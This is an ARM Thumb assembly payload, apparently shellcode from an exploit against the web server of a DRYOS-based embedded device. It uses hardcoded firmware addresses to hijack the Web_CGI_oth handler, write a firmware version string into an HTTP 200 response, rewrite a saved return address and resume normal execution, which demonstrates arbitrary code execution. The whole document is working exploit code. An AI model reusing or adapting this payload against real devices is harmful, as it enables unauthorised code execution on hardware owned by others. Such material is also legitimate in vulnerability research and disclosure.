
.text
.global _start

_start:

    .code 16
    PUSH {R1-R2}            @ Save registers R1 and R2
                            @ Registers R4, R5, R6, R7 do not need to be saved
                            @ in our context

_get_http_response_object:
    ADD SP, SP, #0x1fc      @ Thumb max SP incremental value
    ADD SP, SP, #0x1fc
    LDR R4, [SP, #0x188]    @ HTTP response object from Web_CGI_oth stack frame
                            @ is located at [SP+0x580]
    SUB SP, SP, #0x1fc
    SUB SP, SP, #0x1fc

_set_http_status_ok:
    MOV R0, R4              @ HTTP response object from Web_CGI_oth stack frame
    LDR R1, =#0x001E9C63    @ Function HTTP_Write_Basic_Response_200
                            @ This function set the response code to 200,
                            @ the status string to "OK" and the Content-Type
                            @ to "text/html"
    BLX R1                  @ call HTTP_Write_Basic_Response_200

_set_response_body:
    LDR R1, =#0x1B17FCF0    @ lpHttpObject
    LDR R1, [R1]            @ Get object address
    LDR R1, [R1]            @ Get vtable address
    LDR R6, [R1,#0x40]      @ Get the method used to write HTTP body
                            @ located at offset 0x40 of the vtable

_write_firmware_version:
    LDR R0, =#0x1B17FCF0   @ lpHttpObject
    MOV R1, R4             @ HTTP response object from Web_CGI_oth stack frame
    LDR R2, =#0xA529C7     @ Firmware string address in firmware ("DRYOS version 2.3, release #0049+SMP")
    MOVS R3, #0            @ Default encoding
    BLX R6                 @ call HTTP_OBJ_Write_Http_Body

    LDR R1, =#0x00204EDD   @ Web_CGI_oth+0x6e
    STR R1, [SP,#36]       @ override return address from Web_CGI_oth+0x4e
                           @ to Web_CGI_oth+0x6e
_restore_flow_exec:
    POP {R1-R2}            @ Restore registers R1 and R2
    LDR R0, =#0x00204DCB   @ Return to Web_CGI_oth_extract_OTH_args+0xA
    PUSH {R0}              @ Push return address
    MOVS R0, #1            @ Set return value to 1
    POP {PC}               @ Pop return address
